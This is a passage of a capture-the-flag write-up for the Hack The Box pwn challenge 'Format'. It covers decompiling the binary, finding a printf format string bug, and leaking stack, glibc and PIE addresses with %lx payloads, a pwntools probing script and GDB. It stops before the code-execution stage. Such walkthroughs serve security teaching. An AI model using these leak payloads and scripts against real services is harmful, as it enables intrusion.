<!doctype html><html lang="en"><head><title>Format | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Format String vulnerability"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Format String vulnerability"><meta itemprop="keywords" content><meta itemprop="name" content="Format"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Format String vulnerability"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Format"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Format String vulnerability"><meta name="twitter:description" content="64-bit binary. Format String vulnerability"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Format"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/format/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/&amp;text=Format" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/&amp;title=Format" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Format</h1><p class="mb4 f6 dib tracked">9 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a></li><li><a href="#format-string-vulnerability">Format String vulnerability</a></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#finding-remote-glibc-version">Finding remote Glibc version</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>format</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>After executing it, we see that the program only echoes what we enter:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./format</span>  
asdf
asdf
fdsa
fdsa
</code></pre></div><p>Using Ghidra, we can reverse engineer the source code and see what the program is doing:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(EVP_PKEY_CTX </span><span class="mtk5">*</span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk8">init</span><span class="mtk1">(param_1);</span>
<span class="mtk1">  </span><span class="mtk8">echo</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The <code>main</code> function calls <code>echo</code>, which is the one responding with the same message we enter:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">echo</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> data[</span><span class="mtk6">264</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>  

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(data, </span><span class="mtk6">256</span><span class="mtk1">, stdin);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(data);</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><h2 id="format-string-vulnerability">Format String vulnerability</h2><p>However, it is putting directly our input in <code>printf</code> as first parameter, so this is a clear Format String vulnerability.</p><p>Using this vulnerability we are able to leak values from the stack using formats like <code>%lx</code> (for hexadecimal values):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./format</span>
%lx
7f3f0d7e4a03
%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
7f3f0d7e4a03.0.7f3f0d705fd2.7ffe6cdfdd60.0.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9800000000a.  
</code></pre></div><p>Notice how <code>%lx</code> is replaced with a hexadecimal value on the server&rsquo;s response. Also, if we send multiple formats, the position read from the stack is incremented, and we find our input string as well (<code>2e786c252e786c25</code> is <code>%lx.%lx.</code> in hexadecimal, little-endian format), at position 6. We can check that we control the stack from this position:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./format</span>
AAAABBBB.%6$lx
AAAABBBB.4242424241414141
%7$lx...AAAABBBB
4242424241414141...AAAABBBB  
</code></pre></div><p>In the above example we put <code>AAAABBBB</code> (8 bytes) at position 6, so using <code>%6$lx</code> will print that string in hexadecimal format. On the other hand, we used <code>%7$lx...</code> to fill position 6 and then <code>AAAABBBB</code> at position 7, so that <code>%7$lx</code> is replaced by <code>4242424241414141</code>.</p><p>Format String vulnerabilities also allow us to write arbitrary data into memory using format <code>%n</code>. This format stores the number of characters printed up to the format into the address referenced by the format. For instance, if we put an address in our first 8 bytes of payload, using <code>%6$n</code> right after will store the value <code>8</code> at that address. In order to store arbitrary values, we can make use of <code>%c</code>. For instance, <code>%256c</code> will be replaced by 256 white spaces.</p><h2 id="format-string-exploitation">Format String exploitation</h2><p>There are no more functions in the binary and we do not know which version of Glibc it is using. Moreover, PIE and Full RELRO are enabled, so first we must obtain the base address of the actual binary and the base address of Glibc.</p><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>To bypass PIE, we must leak the address of some instruction of the binary, in order to compare it to its offset (obtained with Ghidra, GDB or <code>readelf</code>, for example) and then substract those values.</p><p>Just for testing, I will disable ASLR so that all memory addresses are fix:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 0 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
0
</code></pre></div><p>Now, I will use a simple Python script to test the first 50 positions in the stack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

context.binary <span class="mtk5">=</span> elf <span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'format'</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span>elf<span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">log_level</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'CRITICAL'</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">50</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'%</span><span class="mtk6">{</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1}</span><span class="mtk4">$lx'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">        </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">())</span>  


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './format'
    Arch:     amd64-64-little  
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
1 7ffff7fa9a03
2 0
3 7ffff7ecafd2
4 7fffffffe5a0
5 0
6 a786c243625
7 58000000380
8 98000000980
9 98000000980
10 98000000980
11 98000000980
12 98000000980
13 98000000980
14 98000000980
15 98000000980
16 98000000980
17 98000000980
18 98000000980
19 98000000980
20 0
21 7ffff7faa5c0
22 0
23 7ffff7e4f525
24 0
25 7ffff7faa5c0
26 0
27 0
28 7ffff7fa64a0
29 7ffff7e4b53d
30 7ffff7faa5c0
31 7ffff7e41de5
32 5555555552d0
33 7fffffffe6b0
34 5555555550c0
35 7fffffffe7c0
36 0
37 55555555526d
38 7ffff7fae2e8
39 f271cac3db528500
40 7fffffffe6d0
41 5555555552b3
42 7fffffffe7c0
43 5808d96f04513c00
44 0
45 7ffff7de1083
46 7ffff7ffc620
47 7fffffffe7c8
48 100000000
49 555555555284
50 5555555552d0
</code></pre></div><p>From experience, I know that addresses that start with <code>555555555</code> are addresses within the binary, addresses that start with <code>7ffff7f</code> come from Glibc, and those that start with <code>7fffffff</code> are stack addresses.</p><p>Let&rsquo;s use GDB to find what are some addresses for:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">format</span>
Reading symbols from <span class="code-dark-green">format</span>...
(No debugging symbols found in <span class="code-dark-green">format</span>)  
<span class="code-red">gef➤  </span>start
<span class="code-blue">[+]</span> Breaking at '0x1284'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x 0x7ffff7fa9a03
<span class="code-dark-blue">0x7ffff7fa9a03</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdin_</span>+131&gt;:    0x00000000
<span class="code-green">gef➤  </span>x 0x7ffff7ecafd2
<span class="code-dark-blue">0x7ffff7ecafd2</span> &lt;<span class="code-dark-yellow">__GI___libc_read</span>+18&gt;:   0xf0003d48
<span class="code-green">gef➤  </span>x 0x7ffff7e4f525
<span class="code-dark-blue">0x7ffff7e4f525</span> &lt;<span class="code-dark-yellow">_IO_default_setbuf</span>+69&gt;: 0x0ffff883
<span class="code-green">gef➤  </span>x 0x7ffff7faa5c0
<span class="code-dark-blue">0x7ffff7faa5c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stderr_</span>&gt;:       0xfbad2086
<span class="code-green">gef➤  </span>x 0x7ffff7fa64a0
<span class="code-dark-blue">0x7ffff7fa64a0</span> &lt;<span class="code-dark-yellow">_IO_file_jumps</span>&gt;:        0x00000000
<span class="code-green">gef➤  </span>x 0x7ffff7e4b53d
<span class="code-dark-blue">0x7ffff7e4b53d</span> &lt;<span class="code-dark-yellow">_IO_new_file_setbuf</span>+13&gt;:        0x74c08548  
<span class="code-green">gef➤  </span>x 0x7ffff7e41de5
<span class="code-dark-blue">0x7ffff7e41de5</span> &lt;<span class="code-dark-yellow">__GI__IO_setvbuf</span>+261&gt;:  0x48c03145
<span class="code-green">gef➤  </span>x 0x7ffff7fae2e8
<span class="code-dark-blue">0x7ffff7fae2e8</span> &lt;<span class="code-dark-yellow">__exit_funcs_lock</span>&gt;:     0x00000000
<span class="code-green">gef➤  </span>x 0x7ffff7de1083
<span class="code-dark-blue">0x7ffff7de1083</span> &lt;<span class="code-dark-yellow">__libc_start_main</span>+243&gt;: 0xb6e8c789
<span class="code-green">gef➤  </span>x 0x7ffff7ffc620
<span class="code-dark-blue">0x7ffff7ffc620</span> &lt;<span class="code-dark-yellow">_rtld_global_ro</span>&gt;:       0x00000000
<span class="code-green">gef➤  </span>x 0x5555555552d0
<span class="code-dark-blue">0x5555555552d0</span> &lt;<span class="code-dark-yellow">__libc_csu_init</span>&gt;:       0xfa1e0ff3
<span class="code-green">gef➤  </span>x 0x5555555550c0
<span class="code-dark-blue">0x5555555550c0</span> &lt;<span class="code-dark-yellow">_start</span>&gt;:        0xfa1e0ff3
<span class="code-green">gef➤  </span>x 0x55555555526d
<span class="code-dark-blue">0x55555555526d</span> &lt;<span class="code-dark-yellow">init</span>+117&gt;:      0x458b4890
<span class="code-green">gef➤  </span>x 0x5555555552b3
<span class="code-dark-blue">0x5555555552b3</span> &lt;<span class="code-dark-yellow">main</span>+47&gt;:       0x000000b8
<span class="code-green">gef➤  </span>x 0x555555555284
<span class="code-dark-blue">0x555555555284</span> &lt;<span class="code-dark-yellow">main</span>&gt;:  0xfa1e0ff3
</code></pre></div><p>We have plenty of addresses to choose for both Glibc and the binary. For instance, let&rsquo;s use position 21 (<code>_IO_2_1_stderr_</code>) for Glibc and position 49 (<code>main</code>) for the binary. Now, let&rsquo;s find the offsets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">format</span>
        linux-vdso.so.1 (0x00007ffff7fcd000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7db8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> _IO_2_2_stderr_
  1427: 00000000001ed5c0   224 OBJECT  GLOBAL DEFAULT   34 <span class="code-red">_IO_2_1_stderr_</span>@@GLIBC_2.2.5  

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">format</span> | <span class="code-dark-green">grep</span> main$
    67: 0000000000001284    74 FUNC    GLOBAL DEFAULT   16 <span class="code-red">main
